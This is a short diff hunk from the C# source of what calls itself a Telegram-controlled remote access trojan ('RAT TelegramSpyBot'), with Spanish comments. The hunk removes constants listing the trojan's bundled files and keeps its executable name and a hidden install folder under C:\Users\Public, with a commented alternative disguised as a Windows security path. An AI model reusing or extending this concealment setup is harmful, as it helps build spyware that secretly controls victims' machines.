@@ -24,12 +24,6 @@ namespace RAT_BotTelegram {
         // Config de Trojan // No cambiar si no cambiaste el nombre del troyano
         // Esta información la encuentras en la carpeta = @"RAT TelegramSpyBot\bin\Debug"
         public const string NAME_EXE = "RAT TelegramSpyBot.exe";  
-        public const string NAME_EXE_CONFIG = NAME_EXE+".config";
-        public const string NAME_EXE_PDB = NAME_EXE + ".pdb";
-        public const string DLL_TELEGRAMBOT = "Telegram.Bot.dll";
-        public const string XML_TELEGRAMBOT = "Telegram.Bot.xml";
-        public const string DLL_NEWTONSOFT = "Newtonsoft.Json.dll";
-        public const string XML_NEWTONSOFT = "Newtonsoft.Json.xml";
         public const string PATH_OCUL = @"C:\Users\Public\RAT_Telegram";      // Ruta donde se esconde //@"C:\Users\Public\Public Config\Windows\Security\RAT_Telegram"
 
 
